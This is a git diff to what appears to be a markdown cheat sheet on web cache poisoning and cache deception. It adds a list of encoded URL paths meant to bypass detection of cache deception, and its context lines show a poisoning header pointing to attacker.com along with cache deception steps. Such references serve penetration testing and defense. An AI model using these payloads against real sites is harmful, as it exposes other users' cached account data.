@@ -63,7 +63,6 @@ User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
 X-Host: attacker.com
 ```
 
-
 # Cache Deception
 ### Caching Sensitive Data
 Web Cache Deception on PayPal Home Page
@@ -73,6 +72,13 @@ Web Cache Deception on PayPal Home Page
 4. Open a private tab with the previous URL : `https://www.example.com/myaccount/home/malicous.css`
 5. The content of the cache is displayed
 
+## Detection Bypass Techinques (Cache Deception)
+* `/profile%2ecss`
+* `/profile/;test.css`
+* `/profile/!test.css`
+* `/profile/.css`
+* `/api/messages%0A%0D-test.css`
+* `/api/aut/%0A%0D%09session.css`
 
 ## CloudFlare Caching
 CloudFlare caches the resource when the `Cache-Control` header is set to `public` and `max-age` is greater than `0`.
@@ -90,78 +96,4 @@ CloudFlare caches the resource when the `Cache-Control` header is set to `public
 ## Tools
 * [PortSwigger/param-miner](https://github.com/PortSwigger/param-miner)
 * [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
